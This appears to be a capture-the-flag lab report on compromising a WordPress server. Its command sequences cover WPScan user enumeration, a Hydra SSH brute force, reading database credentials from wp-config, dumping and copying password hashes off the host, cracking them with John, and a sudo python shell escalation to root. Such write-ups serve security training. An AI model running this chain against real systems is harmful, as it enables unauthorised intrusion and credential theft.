# Red Team: Summary of Operations

## Table of Contents
- Exposed Services
- Critical Vulnerabilities
- Exploitation

### Exposed Services

Nmap scan results for each machine reveal the below services and OS details:

```bash
$ nmap -sV 192.168.1.110
 
```
![Nmap Scan](Images/nmap_service_scan.png "Nmap Scan")

This scan identifies the services below as potential points of entry:
- Target 1

| PORT  | STATE  |  SERVICE |  VERSION |
| :------------ | :------------ | :------------ | :------------ |
|22/TCP   |OPEN   |ssh   |OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)   |
|80/TCP   |OPEN   |http   |Apache httpd 2.4.10 ((Debian))   |
|111/TCP   |OPEN   |rpcbind   |2-4 (RPC #100000)   |
|139/TCP   |OPEN   |netbios-ssn   |Samba smbd 3.x - 4.x (workgroup:WORKGROUP)   |
|445/TCP   |OPEN   |netbios-ssn   |Samba smbd 3.x - 4.x (workgroup:WORKGROUP)   |


The following vulnerabilities were identified on each target:
- Target 1

|  Vulnerabiliy | CVE #  | Severity Score | Description  | Impact
| ------------ | ------------ | ------------ | ------------ |------------ |
|WordPress XMLRPC pingback API and Locator | CVE-2013-0235  | 6.4  |Can be exploited by using a simple POST to a specific file on a wordpress server, Locator can be used to find servers with a pingback API enabled.  | Allows for Locating a pingback server and will target internal layers to change configuration on devices.
|WordPress XMLRPC GHOST Vulnerability Scanner  | CVE-2015-0235  |10   | Can be used to  determine if the host is vulnerable to the GHOST vulnerability via a call to the wordpress XMLRPC interface.  |If the target is vulnerable, the system willfail and return a server error.
|WordPress XMLRPC Dos  |CVE-2014-5266   |  5 |wordpress XMLRPC parsing is vulnerable to XML based denial of service attacks.   |Allows for specific DoS attacks to affect the wordpress server, can be used in conjunction with pingback responses.
|WordPress XMLRPC Login   |CVE-2009-2335   | 5  |Worpress server will send back information on Valid or Invalid usernames allowing attackers to determine valid usernames.  | Allows for brute force attempts to gain access to passwords.

To further point out the severity of the vulnerabilities on this machine;

  - WordPress Discoverable Usernames.
  - Simple Passwords.
  - wp-config in default location on WordPress installation.
  - NOPASSWD Privilege Escalation

We also ran nmap -sV --script=vulners -v 192.168.1.110 to Ennumerate further machine vulnerabilities and they came up as follows;

Read more [here](./raw.txt)

### Exploitation

The Red Team was able to penetrate `Target 1` and retrieve the following confidential data:
- Target 1
  - `flag1.txt`: b9bbcb33ellb80be759c4e844862482d
    - **Exploit Used**
      - WPScan to ennumerate users from the Target 1 WordPress site
      - Command:
        - ```bash
          $ wpscan --url http://192.168.1.110 --detection-mode aggressive -eu
          ```
    ![Ennumerate_users](./images/wpscan_ennumerate.png)
    - Targeting Michael
      - Using Hydra and the following command;
      ``` bash
      hydra -l michael -P /usr/share/wordlist/rockyou.txt -s 22 192.168.1.110 ssh
      ```
      But this Password was so simple it could have been guessed outright
      - password is "michael"
      - Capturing flag 1
        - the flag was found inside of a file located in /var/www/html folder at root in service.html in a comment below the footer.
        - commands are as follows;
          ```bash
          $ ssh michael@192.168.1.110
          password = michael
          $ cd ../../var/www/html
          $ cat service.html | grep flag1
          ```
        ![Flag1](./images/flag_1.png)
          
  - `flag2.txt`: fc3fd58dcdad9ab23faca6e9a3e581c
    - **Exploit Used**
      - After gaining ssh access for flag 1 we can locate flag 2 in the file system.
      - Capturing flag 2: whilst traversing the file system we can locate flag 2 in /var/www/flag2.txt
      - Commands;
        ```bash
        $ ssh michael@192.168.1.110
        password = michael
        $ cd ../../
        $ find . -iname *flag*.txt
        $ cd /var/www
        $ cat flag2.txt
        ```
     ![find](./images/initial_find.png)
     ![flag2](./images/flag_2.png) 

  - `flag3.txt`: afc01ab56b50591e7dccf93122770cd2
    - **Exploit Used**
      - Accessing Mysql Database to find the flags
        - by checking the wp-config file we can view the password for the Database

    ![wpdbpass](./images/DB_user_password.png)

      - once having found this password we found flag3 with the following commands;
        ```bash
        $ mysql -u root -p’R@v3nSecurity’ -h 127.0.0.1
        $ show databases;
        $ use wordpress;
        $ show tables;
        $ select * from wp_posts;
        ```
    ![flag3](./images/flag_3.png)
        
      - we also discovered flag 4 here

    ![flag4](./images/flag_4.png)

  - `flag4.txt`: 715dea6c055b9fe3337544932f2941ce
    - **Exploit Used**
      - Exploting the Database we also found unsalted passwrod hashes that we could use to gain access to steven
      - Commands;
        ```bash
        $ mysql -u root -p’R@v3nSecurity’ -h 127.0.0.1
        $ show databases;
        $ use wordpress;
        $ show tables;
        $ select * from wp_users;

    - we get this output;

    ![hashes](./images/password_hashes.png)

    - using the following command we were able to save the data from wp_users to a file to use later;
      ```bash
      $ select user_login,user_pass from wp_users
      $ into outfile ./wp_hashes.txt;
      ```
   - this then allows us to modify and move the wp_hashes file back to the kali machine;
    ```bash
    $ exit
    $ scp michael@192.168.1.110:/var/www/html/wp_hashes.txt .
    password = michael
    ```
  ![scptransfer](./images/wp_hashes_transfer.png)
  ![hashes.txt](./images/wp_hashes_kali.png)

  - then we can use john the ripper to crack the hash
    ```bash
    $ john wp_hashes.txt
    ```

  ![steven_pass](./images/steven_pass.png)

  - Now that we have stevens password we cna log into his account via ssh;

    ```bash
    $ ssh steven@192.168.1.110
    password = pink84
    $ sudo -l
    $ sudo python -c "import pty; pty.spawn(\"/bin/bash\")"
    $ cd /root
    $ ls
    $ cat flag4.txt
    ```
  
  ![flag4](./images/flag_4_file.png)